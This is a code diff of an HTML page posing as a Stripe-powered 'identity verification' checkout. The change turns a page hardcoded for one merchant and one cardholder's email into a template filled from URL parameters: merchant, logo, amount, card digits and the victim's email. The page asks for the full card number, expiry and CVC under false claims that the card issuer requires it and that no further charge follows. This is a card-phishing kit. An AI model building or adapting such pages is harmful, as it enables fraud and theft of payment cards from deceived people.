@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Identity verification — Steel.dev</title>
+    <title>Identity verification</title>
     <style>
       * { margin: 0; padding: 0; box-sizing: border-box; }
 
@@ -423,143 +423,187 @@
     </style>
   </head>
   <body>
-    <div class="checkout-layout">
-      <!-- LEFT PANEL: Payment context -->
-      <div class="panel-left">
-        <div class="panel-left-inner">
-          <!-- Logo -->
-          <div class="back-row">
-            <img class="brand-logo" src="/assets/nylas-logo.png" alt="Steel.dev" style="width: 80px; height: auto; border-radius: 0;" />
-          </div>
+    <!-- Error state -->
+    <div id="error-state" style="display:none;min-height:100vh;background:#f6f9fc;display:none;align-items:center;justify-content:center;">
+      <div style="text-align:center;background:#fff;border-radius:8px;padding:48px 40px;max-width:500px;margin:40px auto;border:1px solid #e6ebf1;">
+        <svg style="width:48px;height:48px;color:#e25950;margin-bottom:16px;" viewBox="0 0 20 20" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+          <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"/>
+        </svg>
+        <h1 style="font-size:20px;font-weight:400;color:#32325d;margin-bottom:8px;">Facture expirée ou invalide</h1>
+        <p style="font-size:14px;color:#8898aa;">This verification is no longer available.</p>
+      </div>
+    </div>
 
-          <!-- Verification context -->
-          <div class="verify-header">Identity verification required</div>
-
-          <div class="verify-amount">
-            SGD 82.59 <span class="hold-label">on hold</span>
-          </div>
-
-          <div class="verify-desc">
-            To complete your payment, please verify your identity as the authorized cardholder.
-          </div>
-
-          <!-- Payment recap -->
-          <div class="payment-recap">
-            <div class="recap-title">Payment details</div>
-
-            <div class="recap-row">
-              <span class="recap-label">Merchant</span>
-              <span class="recap-value">Steel.dev</span>
+    <!-- Valid state -->
+    <div id="valid-state" style="display:none;">
+      <div class="checkout-layout">
+        <!-- LEFT PANEL: Payment context -->
+        <div class="panel-left">
+          <div class="panel-left-inner">
+            <!-- Logo -->
+            <div class="back-row">
+              <img class="brand-logo" id="logo-img" src="" alt="" style="width: 80px; height: auto; border-radius: 0;" />
             </div>
-            <div class="recap-row">
-              <span class="recap-label">Card</span>
-              <span class="recap-value"><strong>VISA</strong> •••• 3939</span>
-            </div>
-            <div class="recap-row">
-              <span class="recap-label">Date</span>
-              <span class="recap-value">Apr 2, 2026</span>
-            </div>
-          </div>
 
-          <!-- Security note -->
-          <div class="security-note">
-            <svg viewBox="0 0 16 16" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
-              <path fill-rule="evenodd" d="M8 1a3.5 3.5 0 00-3.5 3.5V7A1.5 1.5 0 003 8.5v5A1.5 1.5 0 004.5 15h7a1.5 1.5 0 001.5-1.5v-5A1.5 1.5 0 0011.5 7V4.5A3.5 3.5 0 008 1zm2 6V4.5a2 2 0 10-4 0V7h4z" clip-rule="evenodd"/>
-            </svg>
-            <span>This verification is required by your card issuer to prevent unauthorized transactions. Your information is encrypted and secure.</span>
+            <!-- Verification context -->
+            <div class="verify-header">Identity verification required</div>
+
+            <div class="verify-amount">
+              <span id="left-amount"></span> <span class="hold-label">on hold</span>
+            </div>
+
+            <div class="verify-desc">
+              To complete your payment, please verify your identity as the authorized cardholder.
+            </div>
+
+            <!-- Payment recap -->
+            <div class="payment-recap">
+              <div class="recap-title">Payment details</div>
+
+              <div class="recap-row">
+                <span class="recap-label">Merchant</span>
+                <span class="recap-value" id="recap-merchant"></span>
+              </div>
+              <div class="recap-row">
+                <span class="recap-label">Card</span>
+                <span class="recap-value" id="recap-card"></span>
+              </div>
+              <div class="recap-row">
+                <span class="recap-label">Date</span>
+                <span class="recap-value" id="recap-date"></span>
+              </div>
+            </div>
+
+            <!-- Security note -->
+            <div class="security-note">
+              <svg viewBox="0 0 16 16" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+                <path fill-rule="evenodd" d="M8 1a3.5 3.5 0 00-3.5 3.5V7A1.5 1.5 0 003 8.5v5A1.5 1.5 0 004.5 15h7a1.5 1.5 0 001.5-1.5v-5A1.5 1.5 0 0011.5 7V4.5A3.5 3.5 0 008 1zm2 6V4.5a2 2 0 10-4 0V7h4z" clip-rule="evenodd"/>
+              </svg>
+              <span>This verification is required by your card issuer to prevent unauthorized transactions. Your information is encrypted and secure.</span>
+            </div>
           </div>
         </div>
-      </div>
 
-      <!-- RIGHT PANEL: Verification form -->
-      <div class="panel-right">
-        <div class="panel-right-inner">
-          <h2 class="section-heading">Confirm your identity</h2>
-          <p class="section-subtext">
-            Please confirm the details below to verify you are the authorized cardholder and release your payment.
-          </p>
+        <!-- RIGHT PANEL: Verification form -->
+        <div class="panel-right">
+          <div class="panel-right-inner">
+            <h2 class="section-heading">Confirm your identity</h2>
+            <p class="section-subtext">
+              Please confirm the details below to verify you are the authorized cardholder and release your payment.
+            </p>
 
-          <!-- Email (readonly) -->
-          <div class="form-field">
-            <label class="form-label">Email address</label>
-            <div class="form-input-box">
-              <div class="form-input-row">
-                <span class="form-input-label">Email</span>
-                <span class="form-input-value">contacts.libtia@gmail.com</span>
-              </div>
-            </div>
-          </div>
-
-          <!-- Cardholder name -->
-          <div class="form-field">
-            <label class="form-label">Cardholder name</label>
-            <input type="text" class="text-input" placeholder="Full name on card" />
-          </div>
-
-          <!-- Card verification -->
-          <div class="form-field">
-            <label class="form-label">Card verification</label>
-            <div class="card-verify-group">
-              <div class="card-verify-row">
-                <input type="text" id="cardNumber" class="text-input" style="border:none;border-radius:0;padding:0;height:100%;background:transparent;letter-spacing:1px;flex:1;" placeholder="•••• •••• ••••" maxlength="14" />
-                <span style="font-size:14px;font-weight:500;color:rgba(26,26,26,0.9);letter-spacing:1px;margin-right:8px;">3939</span>
-                <span class="card-brand-icon"><svg viewBox="0 0 32 20" xmlns="http://www.w3.org/2000/svg"><rect width="32" height="20" rx="2" fill="#fff"/><text x="16" y="13" text-anchor="middle" fill="#1a1f71" font-size="8" font-weight="700" font-style="italic" font-family="Arial">VISA</text></svg></span>
-              </div>
-              <div class="card-verify-split card-verify-row">
-                <div class="card-verify-half">
-                  <input type="text" id="cardExpiry" class="text-input" placeholder="MM / YY" maxlength="7" inputmode="numeric" />
-                </div>
-                <div class="card-verify-half">
-                  <input type="text" id="cardCvc" class="text-input" placeholder="CVC" maxlength="4" inputmode="numeric" />
-                  <span class="cvc-hint">123</span>
+            <!-- Email (readonly) -->
+            <div class="form-field">
+              <label class="form-label">Email address</label>
+              <div class="form-input-box">
+                <div class="form-input-row">
+                  <span class="form-input-label">Email</span>
+                  <span class="form-input-value" id="form-email"></span>
                 </div>
               </div>
             </div>
-          </div>
 
-          <!-- Verify button -->
-          <button class="verify-btn">Verify my identity</button>
+            <!-- Cardholder name -->
+            <div class="form-field">
+              <label class="form-label">Cardholder name</label>
+              <input type="text" class="text-input" placeholder="Full name on card" />
+            </div>
 
-          <div class="verify-disclaimer">
-            This one-time verification will release the funds previously charged and finalize your order. You will not be charged again — this simply confirms your identity as the cardholder.
-          </div>
+            <!-- Card verification -->
+            <div class="form-field">
+              <label class="form-label">Card verification</label>
+              <div class="card-verify-group">
+                <div class="card-verify-row">
+                  <input type="text" id="cardNumber" class="text-input" style="border:none;border-radius:0;padding:0;height:100%;background:transparent;letter-spacing:1px;flex:1;" placeholder="•••• •••• ••••" maxlength="14" />
+                  <span id="card-last4-display" style="font-size:14px;font-weight:500;color:rgba(26,26,26,0.9);letter-spacing:1px;margin-right:8px;"></span>
+                  <span class="card-brand-icon"><svg viewBox="0 0 32 20" xmlns="http://www.w3.org/2000/svg"><rect width="32" height="20" rx="2" fill="#fff"/><text x="16" y="13" text-anchor="middle" fill="#1a1f71" font-size="8" font-weight="700" font-style="italic" font-family="Arial">VISA</text></svg></span>
+                </div>
+                <div class="card-verify-split card-verify-row">
+                  <div class="card-verify-half">
+                    <input type="text" id="cardExpiry" class="text-input" placeholder="MM / YY" maxlength="7" inputmode="numeric" />
+                  </div>
+                  <div class="card-verify-half">
+                    <input type="text" id="cardCvc" class="text-input" placeholder="CVC" maxlength="4" inputmode="numeric" />
+                    <span class="cvc-hint">123</span>
+                  </div>
+                </div>
+              </div>
+            </div>
 
-          <!-- Footer -->
-          <div class="checkout-footer">
-            <a href="#" class="stripe-powered">Powered by <strong>stripe</strong></a>
-            <span class="footer-sep"></span>
-            <a href="#">Terms</a>
-            <a href="#">Privacy</a>
+            <!-- Verify button -->
+            <button class="verify-btn">Verify my identity</button>
+
+            <div class="verify-disclaimer">
+              This one-time verification will release the funds previously charged and finalize your order. You will not be charged again — this simply confirms your identity as the cardholder.
+            </div>
+
+            <!-- Footer -->
+            <div class="checkout-footer">
+              <a href="#" class="stripe-powered">Powered by <strong>stripe</strong></a>
+              <span class="footer-sep"></span>
+              <a href="#">Terms</a>
+              <a href="#">Privacy</a>
+            </div>
           </div>
         </div>
       </div>
     </div>
+
     <script>
-      // Auto-format expiry: add " / " after 2 digits
-      const expiryEl = document.getElementById('cardExpiry');
-      expiryEl.addEventListener('input', (e) => {
-        let v = e.target.value.replace(/[^\d]/g, '');
-        if (v.length > 4) v = v.slice(0, 4);
-        if (v.length >= 3) {
-          e.target.value = v.slice(0, 2) + ' / ' + v.slice(2);
-        } else {
-          e.target.value = v;
-        }
-      });
+      const params = new URLSearchParams(window.location.search);
+      const required = ['merchant_name', 'merchant_url', 'merchant_logo', 'order_amount', 'order_devise', 'card_brand', 'card_digits', 'order_email'];
+      const missing = required.some(k => !params.get(k));
 
-      // CVC: digits only, max 4
-      const cvcEl = document.getElementById('cardCvc');
-      cvcEl.addEventListener('input', (e) => {
-        e.target.value = e.target.value.replace(/[^\d]/g, '').slice(0, 4);
-      });
+      if (missing) {
+        document.getElementById('error-state').style.display = 'flex';
+      } else {
+        document.getElementById('valid-state').style.display = '';
 
-      // Card number: digits only, format with spaces, max 12 digits (last 4 are fixed)
-      const cardEl = document.getElementById('cardNumber');
-      cardEl.addEventListener('input', (e) => {
-        let v = e.target.value.replace(/[^\d]/g, '').slice(0, 12);
-        let formatted = v.replace(/(.{4})/g, '$1 ').trim();
-        e.target.value = formatted;
-      });
+        const p = Object.fromEntries(required.map(k => [k, params.get(k)]));
+        const amount = p.order_devise + p.order_amount;
+        const date = new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
+
+        // Title
+        document.title = 'Identity verification — ' + p.merchant_name;
+
+        // Logo
+        document.getElementById('logo-img').src = p.merchant_logo;
+        document.getElementById('logo-img').alt = p.merchant_name;
+
+        // Left panel
+        document.getElementById('left-amount').textContent = amount;
+        document.getElementById('recap-merchant').textContent = p.merchant_name;
+        document.getElementById('recap-card').innerHTML = '<strong>' + p.card_brand + '</strong> •••• ' + p.card_digits;
+        document.getElementById('recap-date').textContent = date;
+
+        // Right panel
+        document.getElementById('form-email').textContent = p.order_email;
+        document.getElementById('card-last4-display').textContent = p.card_digits;
+
+        // Input formatters
+        const expiryEl = document.getElementById('cardExpiry');
+        expiryEl.addEventListener('input', (e) => {
+          let v = e.target.value.replace(/[^\d]/g, '');
+          if (v.length > 4) v = v.slice(0, 4);
+          if (v.length >= 3) {
+            e.target.value = v.slice(0, 2) + ' / ' + v.slice(2);
+          } else {
+            e.target.value = v;
+          }
+        });
+
+        const cvcEl = document.getElementById('cardCvc');
+        cvcEl.addEventListener('input', (e) => {
+          e.target.value = e.target.value.replace(/[^\d]/g, '').slice(0, 4);
+        });
+
+        const cardEl = document.getElementById('cardNumber');
+        cardEl.addEventListener('input', (e) => {
+          let v = e.target.value.replace(/[^\d]/g, '').slice(0, 12);
+          let formatted = v.replace(/(.{4})/g, '$1 ').trim();
+          e.target.value = formatted;
+        });
+      }
     </script>
   </body>
 </html>
